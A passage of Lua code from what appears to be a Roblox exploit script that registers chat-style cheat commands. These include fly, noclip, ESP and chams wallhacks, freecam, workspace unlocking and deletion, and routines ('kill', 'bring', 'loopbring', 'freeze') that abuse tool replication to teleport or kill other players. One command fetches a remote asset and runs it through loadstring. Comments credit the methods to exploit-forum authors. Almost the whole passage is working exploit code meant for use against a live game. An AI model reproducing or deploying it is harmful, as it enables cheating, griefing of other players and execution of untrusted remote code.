	playerid.Parent = background
	playerid.BackgroundColor3 = Color3.new(0, 0.8, 1)
	playerid.BackgroundTransparency = 1
	playerid.BorderColor3 = Color3.new(0.2, 0.8, 0.2)
	playerid.Position = UDim2.new(0, 5, 0, 35)
	playerid.Size = UDim2.new(0, 100, 0, 20)
	playerid.ZIndex = 10
	playerid.Font = Enum.Font.SourceSans
	playerid.FontSize = Enum.FontSize.Size14
	playerid.Text = "Player ID: LOADING"
	playerid.TextColor3 = Color3.new(1, 1, 1)
	playerid.TextXAlignment = Enum.TextXAlignment.Left
	
	players.Name = "players"
	players.Parent = background
	players.BackgroundColor3 = Color3.new(0, 0.8, 1)
	players.BackgroundTransparency = 1
	players.BorderColor3 = Color3.new(0.2, 0.8, 0.2)
	players.Position = UDim2.new(0, 5, 0, 155)
	players.Size = UDim2.new(0, 100, 0, 20)
	players.ZIndex = 10
	players.Font = Enum.Font.SourceSans
	players.FontSize = Enum.FontSize.Size14
	players.Text = "LOADING"
	players.TextColor3 = Color3.new(1, 1, 1)
	players.TextXAlignment = Enum.TextXAlignment.Left
	
	local SINFOGUI = background
	FRAME:TweenPosition(UDim2.new(0.5, -130, 0, 100), "InOut", "Quart", 0.5, true, nil) 
	wait(0.5)
	Exit.MouseButton1Click:Connect(function()
		FRAME:TweenPosition(UDim2.new(0.5, -130, 0, -400), "InOut", "Quart", 0.5, true, nil) 
		wait(0.6)
		FRAME:Destroy()
	end)
	local Asset = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
	SINFOGUI.name.Text = "Place Name: " .. Asset.Name
	SINFOGUI.playerid.Text = "Player ID: " ..Players.LocalPlayer.UserId
	SINFOGUI.maxplayers.Text = Players.MaxPlayers.. " Players Max"
	SINFOGUI.placeid.Text = "Place ID: " ..game.PlaceId
	repeat
		players = Players:getPlayers()
		SINFOGUI.players.Text = #players.. " Player(s)"
		SINFOGUI.appearance.Text = "Appearance: " ..Players.LocalPlayer.CharacterAppearanceId
		local seconds = math.floor(workspace.DistributedGameTime)
		local minutes = math.floor(workspace.DistributedGameTime / 60)
		local hours = math.floor(workspace.DistributedGameTime / 60 / 60)
		local seconds = seconds - (minutes * 60)
	local minutes = minutes - (hours * 60)
		if hours < 1 then if minutes < 1 then
			SINFOGUI.Time.Text = seconds .. " Second(s)" else
			SINFOGUI.Time.Text = minutes .. " Minute(s), " .. seconds .. " Second(s)"
		end
		else
			SINFOGUI.Time.Text = hours .. " Hour(s), " .. minutes .. " Minute(s), " .. seconds .. " Second(s)"
		end
		wait(1)
	until SINFOGUI.Parent == nil
end)

addcmd('breakloops',{'break'},
function(args, speaker)
	lastBreakTime = tick()
end)

addcmd('rejoin',{'rj'},
function(args, speaker)
	game:GetService('TeleportService'):Teleport(game.PlaceId)
end)

addcmd('exit',{},
function(args, speaker)
	game:shutdown() 
end)

runningnoclip = false
Clip = true
addcmd('noclip',{},
function(args, speaker)
Clip = false
	wait(0.1)
	if runningnoclip == false then runningnoclip = true
	game:GetService('RunService').Stepped:connect(function ()
	if Clip == false and Players.LocalPlayer.Character ~= nil then
    for _, child in pairs(Players.LocalPlayer.Character:GetDescendants()) do
	if child:IsA("BasePart") and child.CanCollide == true then
    child.CanCollide = false
	end end end end) end
end)

addcmd('clip',{'unnoclip'},
function(args, speaker)
	Clip = true
end)

addcmd('togglenoclip',{},
function(args, speaker)
	if Clip then
		execCmd('noclip')
	else
		execCmd('clip')
	end
end)

FLYING = false
iyflyspeed = 1
function sFLY()
	repeat wait() until Players.LocalPlayer and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and Players.LocalPlayer.Character:FindFirstChild('Humanoid')
	repeat wait() until IYMouse
	
	local T = Players.LocalPlayer.Character.HumanoidRootPart
	local CONTROL = {F = 0, B = 0, L = 0, R = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
	local SPEED = 0
	
	local function FLY()
		FLYING = true
		local BG = Instance.new('BodyGyro', T)
		local BV = Instance.new('BodyVelocity', T)
		BG.P = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		spawn(function()
		repeat wait()
		Players.LocalPlayer.Character.Humanoid.PlatformStand = true
		if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
		SPEED = 50
		elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
		SPEED = 0
		end
if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
else
BV.velocity = Vector3.new(0, 0, 0)
end
	BG.cframe = workspace.CurrentCamera.CoordinateFrame
			until not FLYING
			CONTROL = {F = 0, B = 0, L = 0, R = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0}
			SPEED = 0
			BG:destroy()
			BV:destroy()
			Players.LocalPlayer.Character.Humanoid.PlatformStand = false
		end)
	end
	IYMouse.KeyDown:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = iyflyspeed
		elseif KEY:lower() == 's' then
			CONTROL.B = -iyflyspeed
		elseif KEY:lower() == 'a' then
			CONTROL.L = -iyflyspeed 
		elseif KEY:lower() == 'd' then 
			CONTROL.R = iyflyspeed
		end
	end)
	IYMouse.KeyUp:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		end
	end)
	FLY()
end

function NOFLY()
	FLYING = false
	Players.LocalPlayer.Character.Humanoid.PlatformStand = false
end

Players.LocalPlayer.CharacterAdded:Connect(function()
	FLYING = false
	Floating = false
	execCmd('clip')
end)

addcmd('fly',{},
function(args, speaker)
	sFLY()
end)

addcmd('flyspeed',{'flysp'},
function(args, speaker)
	if isNumber(args[1]) then
		iyflyspeed = args[1]
	end
end)

addcmd('unfly',{'nofly'},
function(args, speaker)
	NOFLY()
end)

addcmd('togglefly',{},
function(args, speaker)
	if FLYING then
		NOFLY()
	else
		sFLY()
	end
end)

Floating = false
addcmd('float', {},
function(args,speaker)
	Floating = true
	local pchar = Players.LocalPlayer.Character
	if pchar and not pchar:FindFirstChild("Float") then
		spawn(function()
			local Float = Instance.new('Part', pchar)
			Float.Name = 'Float'
			Float.Transparency = 1
			Float.Size = Vector3.new(6,1,6)
			Float.Anchored = true
			Float.CFrame = pchar.HumanoidRootPart.CFrame * CFrame.new(0,-3.5,0)
			notify('Float','Float Enabled')
			spawn(function()
				while wait(0.1) do
					if pchar:FindFirstChild("Float") then
						Float.CFrame = pchar.HumanoidRootPart.CFrame * CFrame.new(0,-3.5,0)
					else
						break
					end
				end
			end)
		end)
	end
end)

addcmd('unfloat',{'nofloat'},
function(args, speaker)
	Floating = false
	local pchar = Players.LocalPlayer.Character
	notify('Float','Float Disabled')
	if pchar:FindFirstChild("Float") then
		pchar.Float:Destroy()
	end
end)

addcmd('togglefloat',{},
function(args, speaker)
	if Floating then
		execCmd('unfloat')
	else
		execCmd('float')
	end
end)

addcmd('savepos',{'spos','saveposition','setwaypoint'},
function(args, speaker)
	local WPName = tostring(getstring(1))
	if speaker.Character:findFirstChild("HumanoidRootPart") then
		notify('Modified Waypoints',"Created waypoint: "..getstring(1))
		local torso = speaker.Character:findFirstChild("HumanoidRootPart")
		WayPoints[#WayPoints + 1] = {NAME = WPName, COORD = {math.floor(torso.Position.X), math.floor(torso.Position.Y), math.floor(torso.Position.Z)}}
	end	
	refreshwaypoints()
	updatesaves()
end)

addcmd('deletepos',{'dpos','deleteposition','deletewaypoint'},
function(args, speaker)
	for i,v in pairs(WayPoints) do
		if v.NAME == tostring(getstring(1)) then
			notify('Modified Waypoints',"Deleted waypoint: " .. v.NAME)
			table.remove(WayPoints, i)
		end
	end
	refreshwaypoints()
	updatesaves()
end)

addcmd('clearpos',{'clrpositions','clearpositions','cpos','clrpos'},
function(args, speaker)
	WayPoints = {}
	refreshwaypoints()
	updatesaves()
	notify('Modified Waypoints','Removed all waypoints')
end)

addcmd('loadpos',{'lpos','loadposition','waypoint'},
function(args, speaker)
	local WPName = tostring(getstring(1))
	if Players.LocalPlayer.Character then
		for i,_ in pairs(WayPoints) do
			local x = WayPoints[i].COORD[1]
			local y = WayPoints[i].COORD[2]
			local z = WayPoints[i].COORD[3]
			if tostring(WayPoints[i].NAME) == tostring(WPName) then
				Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(x,y,z)
			end
		end
	end
end)

addcmd('esp',{},
function(args, speaker)
	if not CHMSenabled then
		ESPenabled = true
		for i,v in pairs(Players:GetChildren()) do
			if v.ClassName == "Player" and v.Name ~= Players.LocalPlayer.Name then
				ESP(v)
			end
		end
	else
		notify('ESP','Disable chams (nochams) before using esp')
	end
end)

addcmd('noesp',{'unesp'},
function(args, speaker)
	ESPenabled = false
	for i,v in pairs(Players:GetChildren()) do
		local espplr = v
		for i,c in pairs(PARENT:GetChildren()) do
			if c.Name == espplr.Name..'_ESP' then
				c:Destroy()
			end
		end
	end
end)

addcmd('chams',{},
function(args, speaker)
	if not ESPenabled then
		CHMSenabled = true
		for i,v in pairs(Players:GetChildren()) do
			if v.ClassName == "Player" and v.Name ~= Players.LocalPlayer.Name then
				CHMS(v)
			end
		end
		else
		notify('Chams','Disable ESP (noesp) before using chams')
	end
end)

addcmd('nochams',{'unchams'},
function(args, speaker)
	CHMSenabled = false
	for i,v in pairs(Players:GetChildren()) do
		local chmsplr = v
		for i,c in pairs(PARENT:GetChildren()) do
			if c.Name == chmsplr.Name..'_CHMS' then
				c:Destroy()
			end
		end
	end
end)

addcmd('locate',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		Locate(Players[v])
	end
end)

addcmd('nolocate',{'unlocate'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		for i,c in pairs(PARENT:GetChildren()) do
			if c.Name == Players[v].Name..'_LC' then
				c:Destroy()
			end
		end
	end
end)

addcmd('view',{'spectate'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		workspace.CurrentCamera.CameraSubject = Players[v].Character
		notify('Spectate','Viewing ' .. Players[v].Name)
	end
end)

addcmd('unview',{'unspectate'},
function()
	workspace.CurrentCamera.CameraSubject = Players.LocalPlayer.Character
	notify('Spectate','View turned off')
end)

local fa = false
local cam = workspace.CurrentCamera
local cam1 = 0
local cam2 = 0
local cam3 = 0
local k1 = false
local k2 = false
local k3 = false
local k4 = false
local k5 = false
local k6 = false
cs = 0.5
function movecam()
	local fc = Players.LocalPlayer.Character:FindFirstChild('xFC')
	if fa == false then
		repeat
			if Players.LocalPlayer.Character:FindFirstChild('xFC') then
				local fp = fc.Position
				fc.CFrame = CFrame.new(Vector3.new(fp.X,fp.Y+cam3,fp.Z),cam.CFrame.p)*CFrame.new(cam2,0,cam1)
				fa = true
				Players.LocalPlayer.Character.Head.Anchored = true
			end
			game:GetService('RunService').RenderStepped:Wait()
		until not Players.LocalPlayer.Character:FindFirstChild('xFC')
		fa = false
	end
end
function kp1(inputObject, gameProcessedEvent)
	if not gameProcessedEvent and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild('xFC') then
		if inputObject.KeyCode == Enum.KeyCode.W or inputObject.KeyCode == Enum.KeyCode.Up then
			k1 = true
			cam1 = cs end
		if inputObject.KeyCode == Enum.KeyCode.S or inputObject.KeyCode == Enum.KeyCode.Down then
			k2 = true
			cam1 = (cs*-1) end
		if inputObject.KeyCode == Enum.KeyCode.A or inputObject.KeyCode == Enum.KeyCode.Left then
			k3 = true
			cam2 = cs end
		if inputObject.KeyCode == Enum.KeyCode.D or inputObject.KeyCode == Enum.KeyCode.Right then
			k4 = true
			cam2 = (cs*-1) end
		if inputObject.KeyCode == Enum.KeyCode.E or inputObject.KeyCode == Enum.KeyCode.Space then
			k5 = true
			cam3 = cs end
		if inputObject.KeyCode == Enum.KeyCode.Q or inputObject.KeyCode == Enum.KeyCode.LeftControl then
			k6 = true
			cam3 = (cs*-1) end
	end
end
UserInputService.InputBegan:connect(kp1)
function kp2(inputObject, gameProcessedEvent)
	if not gameProcessedEvent and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild('xFC') then
		if inputObject.KeyCode == Enum.KeyCode.W or inputObject.KeyCode == Enum.KeyCode.Up then
			k1 = false
			if k2 == false then
				cam1 = 0
			end
		end
		if inputObject.KeyCode == Enum.KeyCode.S or inputObject.KeyCode == Enum.KeyCode.Down then
			k2 = false
			if k1 == false then
				cam1 = 0
			end
		end
		if inputObject.KeyCode == Enum.KeyCode.A or inputObject.KeyCode == Enum.KeyCode.Left then
			k3= false
			if k4== false then
				cam2 = 0
			end
		end
		if inputObject.KeyCode == Enum.KeyCode.D or inputObject.KeyCode == Enum.KeyCode.Right then
			k4 = false
			if k3 == false then
				cam2 = 0
			end
		end
		if inputObject.KeyCode == Enum.KeyCode.E or inputObject.KeyCode == Enum.KeyCode.Space then
			k5 = false
			if k6 == false then
				cam3 = 0
			end
		end
		if inputObject.KeyCode == Enum.KeyCode.Q or inputObject.KeyCode == Enum.KeyCode.LeftControl then
			k6 = false
			if k5 == false then
				cam3 = 0
			end
		end
	end
end
UserInputService.InputEnded:connect(kp2)
fcEnabled = false
function FC()
	if not Players.LocalPlayer.Character:FindFirstChild('xFC') then
		local fc = Instance.new('Part',Players.LocalPlayer.Character)
		fc.CanCollide = false
		fc.Anchored = true
		fc.Transparency = 1
		fc.Size = Vector3.new(1,1,1)
		fc.Name = 'xFC'
		fc.CFrame = Players.LocalPlayer.Character.Head.CFrame
		local cam = workspace.CurrentCamera
		cam.CameraSubject = fc
		cam.CameraType = 'Custom'
		movecam()
	end
end
function UFC()
	if Players.LocalPlayer.Character:FindFirstChild('xFC') then
		Players.LocalPlayer.Character:FindFirstChild('xFC'):Destroy()
		local cam = workspace.CurrentCamera
		cam.CameraSubject = Players.LocalPlayer.Character.Humanoid
		cam.CameraType = 'Custom'
		Players.LocalPlayer.Character.Head.Anchored = false
	end
end

addcmd('freecam',{'fc'},
function(args, speaker)
	FC()
end)

addcmd('fixcam',{},
function(args, speaker)
	UFC()
	workspace.CurrentCamera:remove()
	wait(.1)
	workspace.CurrentCamera.CameraSubject = Players.LocalPlayer.Character.Humanoid
	workspace.CurrentCamera.CameraType = "Custom"
	Players.LocalPlayer.CameraMinZoomDistance = 0.5
	Players.LocalPlayer.CameraMaxZoomDistance = 400
	Players.LocalPlayer.CameraMode = "Classic"
	Players.LocalPlayer.Character.Head.Anchored = false
end)

addcmd('unfreecam',{'nofreecam','unfc','nofc'},
function(args, speaker)
	UFC()
end)

addcmd('freecamspeed',{'fcspeed'},
function(args, speaker)
	if isNumber(args[1]) then
		cs = args[1]
	end
end)

addcmd('firstp',{},
function(args, speaker)
	Players.LocalPlayer.CameraMode = "LockFirstPerson"
end)

addcmd('thirdp',{},
function(args, speaker)
	Players.LocalPlayer.CameraMode = "Classic"
end)

addcmd('maxzoom',{},
function(args, speaker)
	Players.LocalPlayer.CameraMaxZoomDistance = args[1]
end)

addcmd('unlockws',{'unlockworkspace'},
function(args, speaker)
	notify('Workspace Modified','Workspace unlocked')
	wait(1)
    local function unlock(instance) 
        for i,v in pairs(instance:GetChildren()) do
            if v:IsA("BasePart") then
                v.Locked = false
            end
            unlock(v)
        end
    end
    unlock(workspace)
end)

addcmd('lockws',{'lockworkspace'},
function(args, speaker)
	notify('Workspace Modified','Workspace locked')
	wait(1)
    local function lock(instance) 
        for i,v in pairs(instance:GetChildren()) do
            if v:IsA("BasePart") then
                v.Locked = true
            end
            lock(v)
        end
    end
    lock(workspace)
end)

addcmd('delete',{'remove'},
function(args, speaker)
	part = getstring(1)
    local function dels(instance)
        for i,v in pairs(instance:GetChildren())do
            if v.Name:lower() == part:lower() then v:Destroy() end
            dels(v)
        end
    end
    dels(workspace)
notify('Item(s) Deleted','Deleted ' ..getstring(1))
end)

addcmd('deleteclass',{'removeclass','deleteclassname','removeclassname','dc'},
function(args, speaker)
	part = getstring(1)
    local function dels(instance)
        for i,v in pairs(instance:GetChildren())do
            if v.ClassName:lower() == part:lower() then v:Destroy() end
            dels(v)
        end
    end
    dels(workspace)
notify('Item(s) Deleted','Deleted items with ClassName ' ..getstring(1))
end)

addcmd('btools',{},
function(args, speaker)
	Instance.new("HopperBin", Players.LocalPlayer.Backpack).BinType = 1
	Instance.new("HopperBin", Players.LocalPlayer.Backpack).BinType = 2
	Instance.new("HopperBin", Players.LocalPlayer.Backpack).BinType = 3
	Instance.new("HopperBin", Players.LocalPlayer.Backpack).BinType = 4
end)

addcmd('f3x',{'fex'},
function(args, speaker)
	loadstring(game:GetObjects("rbxassetid://1059691823")[1].Source)()
end)

addcmd('age',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		local players = getPlayer(args[1], speaker)
		local ages = {}
		for i,v in pairs(players) do
			local p = Players[v]
			table.insert(ages, p.Name.."'s age is: "..p.AccountAge)
		end
    notify('Account Age',table.concat(ages, ',\n'))
	end
end)

addcmd('os',{'platform', 'device'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	local platforms = {}
	for i,v in pairs(players) do
		local p = Players[v]
		table.insert(platforms, p.Name.."'s platform is: "..p.OsPlatform)
	end
	notify('OS',table.concat(platforms, ',\n'))
end)

addcmd('goto',{'to'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		if Players[v].Character ~= nil then
			if speaker.Character:FindFirstChild("HumanoidRootPart") then
				speaker.Character.Humanoid.Jump = true
			end
			speaker.Character.HumanoidRootPart.CFrame = Players[v].Character.HumanoidRootPart.CFrame + Vector3.new(4,1,0)
		end
	end
end)

bringT = {}
addcmd('loopbring',{},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
			if Players[v].Name ~= Players.LocalPlayer.Name and not FindInTable(bringT, Players[v].Name) then
				table.insert(bringT, Players[v].Name)
				local pchar=Players[v].Character
				pchar.Humanoid.Jump = true
				repeat wait()
				pchar = Players[v].Character
				for i,c in pairs(players) do
					if pchar~= nil and pchar:FindFirstChild("HumanoidRootPart") and speaker.Character ~= nil and speaker.Character:FindFirstChild("HumanoidRootPart") then
						pchar.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame + Vector3.new(3,1,0)
					end
				end
				until not FindInTable(bringT, Players[v].Name)
			end
		end)
	end
end)

addcmd('unloopbring',{'noloopbring'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
		spawn(function()
			for a,b in pairs(bringT) do if b == Players[v].Name then table.remove(bringT, a) end end
		end)
	end
end)

addcmd('freeze',{'fr'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	if players ~= nil then
		for i, v in pairs(players) do
			spawn(function()
				for i, x in next, Players[v].Character:GetDescendants() do
					if x:IsA("Part") and not x.Anchored then
						x.Anchored = true
					end
				end
			end)
		end
	end
end)

addcmd('thaw',{'unfreeze','unfr'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	if players ~= nil then
		for i, v in pairs(players) do
			spawn(function()
				for i, x in next, Players[v].Character:GetDescendants() do
					if x:IsA("Part") and x.Anchored then
						x.Anchored = false
					end
				end
			end)
		end
	end
end)

addcmd('kill',{'fekill'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	if tools(Players.LocalPlayer) then
		for i,v in pairs(players)do
			-- Full credit to CyclicaIIy @V3rmillion
			local LocalPlayer = Players.LocalPlayer
			local ran1 = false
			local ran2 = false
			local equipped = false
			local savepos = LocalPlayer.Character.HumanoidRootPart.CFrame
			local target = Players[v]
			if #LocalPlayer.Backpack:GetChildren() < 2 then
				repeat
					for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
						if tool:IsA("Tool") then
							tool.Parent = LocalPlayer
						end
					end
					LocalPlayer.Character:ClearAllChildren()
					local char = Instance.new("Model", workspace)
					char.Name = "character"
					Instance.new("Part", char).Name = "Torso";
					Instance.new("Part", char).Name = "Head";
					Instance.new("Humanoid", char).Name = "Humanoid";
					LocalPlayer.Character = char
					repeat wait() until LocalPlayer.Character
				until #LocalPlayer:GetChildren() - 4 >= 2
				for _, char in pairs(workspace:GetChildren()) do
					if char.Name == "character" and char:IsA("Model") then
						char:Destroy()
					end
				end
				repeat wait() until LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
				for _, tool in pairs(LocalPlayer:GetChildren()) do
					if tool:IsA("Tool") then
						tool.Parent = LocalPlayer.Backpack
					end
				end
			end
			LocalPlayer.Character.HumanoidRootPart.CFrame = savepos
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Character
			local tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
			tool.Parent = workspace
			local attacher = LocalPlayer.Character:FindFirstChildOfClass("Tool")
			attacher.Parent = workspace
			LocalPlayer.Character.Humanoid:EquipTool(tool)
			repeat wait() until LocalPlayer.Character:FindFirstChildOfClass("Tool") ~= nil
			LocalPlayer.Character.Humanoid:UnequipTools()
			attacher.AncestryChanged:connect(function()
				if ran1 == false then
					ran1 = true
					equipped = true
				end
			end)
			local anim = Instance.new("Animation")
			anim.AnimationId = "rbxassetid://188632011"
			local loadanim = LocalPlayer.Character.Humanoid:LoadAnimation(anim)
			loadanim.Looped = true
			loadanim:Play()
			LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(math.random(-1000, 1000), math.random(0, 1000), math.random(-1000, 1000)))
			local stabilize = Instance.new("Part", workspace)
			stabilize.Size = Vector3.new(50, 1, 50)
			stabilize.Anchored = true
			stabilize.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame * Vector3.new(0, -3.5, 0))
			repeat
				target.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.Position + LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 2 + LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector * 2)
				wait()
			until equipped == true
			stabilize:Destroy()
			loadanim:Stop()
			anim:Destroy()
			LocalPlayer.CharacterAdded:connect(function(character)
				if ran2 == false then
					ran2 = true
					character:WaitForChild("HumanoidRootPart")
					character.HumanoidRootPart.CFrame = savepos
				end
			end)
			tool.GripPos = Vector3.new(0, -math.huge, 0)
			LocalPlayer.Character.Humanoid:EquipTool(tool)
			repeat
				LocalPlayer.Character.Humanoid.Jump = true
				wait()
			until ran2 == true
		end
	else
		notify('Tool Required','You need to have a tool to use this command')
	end
end)

addcmd('bring',{'febring'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	if tools(Players.LocalPlayer) then
		for i,v in pairs(players)do
			-- Full credit to CyclicaIIy @V3rmillion
			local LocalPlayer = Players.LocalPlayer
			local ran1 = false
			local equipped = false
			local savepos = LocalPlayer.Character.HumanoidRootPart.CFrame
			local target = Players[v]
			if #LocalPlayer.Backpack:GetChildren() < 2 then
				repeat
					for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
						if tool:IsA("Tool") then
							tool.Parent = LocalPlayer
						end
					end
					LocalPlayer.Character:ClearAllChildren()
					local char = Instance.new("Model", workspace)
					char.Name = "character"
					Instance.new("Part", char).Name = "Torso";
					Instance.new("Part", char).Name = "Head";
					Instance.new("Humanoid", char).Name = "Humanoid";
					LocalPlayer.Character = char
					repeat wait() until LocalPlayer.Character
				until #LocalPlayer:GetChildren() - 4 >= 2
				for _, char in pairs(workspace:GetChildren()) do
					if char.Name == "character" and char:IsA("Model") then
						char:Destroy()
					end
				end
				repeat wait() until LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
				for _, tool in pairs(LocalPlayer:GetChildren()) do
				if tool:IsA("Tool") then
						tool.Parent = LocalPlayer.Backpack
					end
				end
				LocalPlayer.Character.HumanoidRootPart.CFrame = savepos
			end
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Character
			local tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
			tool.Parent = workspace
			local attacher = LocalPlayer.Character:FindFirstChildOfClass("Tool")
			attacher.Parent = workspace
			LocalPlayer.Character.Humanoid:EquipTool(tool)
			repeat wait() until LocalPlayer.Character:FindFirstChildOfClass("Tool") ~= nil
			LocalPlayer.Character.Humanoid:UnequipTools()
			attacher.AncestryChanged:connect(function()
				if ran1 == false then
					ran1 = true
					equipped = true
				end
			end)
			local anim = Instance.new("Animation")
			anim.AnimationId = "rbxassetid://188632011"
			local loadanim = LocalPlayer.Character.Humanoid:LoadAnimation(anim)
			loadanim.Looped = true
			loadanim:Play()
			repeat
				target.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.Position + LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 2 + LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector * 2)
				wait()
			until equipped == true
			loadanim:Stop()
			anim:Destroy()
			LocalPlayer.Character.Humanoid:EquipTool(tool)
			wait()
			LocalPlayer.Character.Humanoid:UnequipTools()
		end
	else
		notify('Tool Required','You need to have a tool to use this command')
	end
end)

oofing = false
addcmd('loopoof',{},
function(args, speaker)
	oofing = true
	repeat wait(0.01)
		for i,v in pairs(Players:GetPlayers()) do
			if v.Character ~= nil and v.Character:FindFirstChild'Head' then
				for _,x in pairs(v.Character.Head:GetChildren()) do
					if x:IsA'Sound' then x.Playing = true end
				end
			end
		end
	until oofing == false
end)

addcmd('unloopoof',{},
function(args, speaker)
	oofing = false
end)

addcmd('respawn',{'ungod'},
function(args, speaker)
	respawn(Players.LocalPlayer)
end)

addcmd('refresh',{'re'},
function(args, speaker)
	refresh(Players.LocalPlayer)
end)

addcmd('god',{''},
function(args, speaker)
	Players.LocalPlayer.Character.Humanoid.Name = 1
	local l = Players.LocalPlayer.Character["1"]:Clone()
	l.Parent = Players.LocalPlayer.Character
	l.Name = "Humanoid"
	wait(0.1)
	Players.LocalPlayer.Character["1"]:Destroy()
	workspace.CurrentCamera.CameraSubject = Players.LocalPlayer.Character
	Players.LocalPlayer.Character.Animate.Disabled = true
	wait(0.1)
	Players.LocalPlayer.Character.Animate.Disabled = false
	Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
end)

addcmd('invisible',{'invis'},
function(args, speaker)
-- Full credit to Elite1337#9377 & Timeless#4044 @Discord
local function CheckRig()
	if Players.LocalPlayer.Character then
		local Humanoid = Players.LocalPlayer.Character:WaitForChild('Humanoid')
		if Humanoid.RigType == Enum.HumanoidRigType.R15 then
			return 'R15'
		else
			return 'R6'
		end
	end
end
local function InitiateInvis()
	local Character = Players.LocalPlayer.Character
	local StoredCF = Character.PrimaryPart.CFrame
	local Part = Instance.new('Part',workspace)
	Part.Size = Vector3.new(5,0,5)
	Part.Anchored = true
	Part.CFrame = CFrame.new(Vector3.new(9999,9999,9999))
	Character.PrimaryPart.CFrame = Part.CFrame*CFrame.new(0,3,0)
	spawn(function()
		wait(3)
		Part:Destroy()
	end)
	if CheckRig() == 'R6' then
		local Clone = Character.HumanoidRootPart:Clone()
		Character.HumanoidRootPart:Destroy()
		Clone.Parent = Character
	else
	local Clone = Character.LowerTorso.Root:Clone()
	Character.LowerTorso.Root:Destroy()
	Clone.Parent = Character.LowerTorso
	end
end
InitiateInvis()
end)

addcmd('strengthen',{},
function(args, speaker)
	for _, child in pairs(Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			child.CustomPhysicalProperties = PhysicalProperties.new(100, 0.3, 0.5)
		end
	end
end)

addcmd('weaken',{},
function(args, speaker)
	for _, child in pairs(Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			child.CustomPhysicalProperties = PhysicalProperties.new(0, 0.3, 0.5)
		end
	end
end)

addcmd('unweaken',{'unstrengthen'},
function(args, speaker)
	for _, child in pairs(Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
		end
	end
end)

addcmd('jpower',{'jumppower','jp'},
function(args, speaker)
	if Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
		Players.LocalPlayer.Character.Humanoid.JumpPower=tonumber(args[1])
	end
end)

addcmd('gravity',{'grav'},
function(args, speaker)
	workspace.Gravity = (args[1])
end)

addcmd('hipheight',{'hheight'},
function(args, speaker)
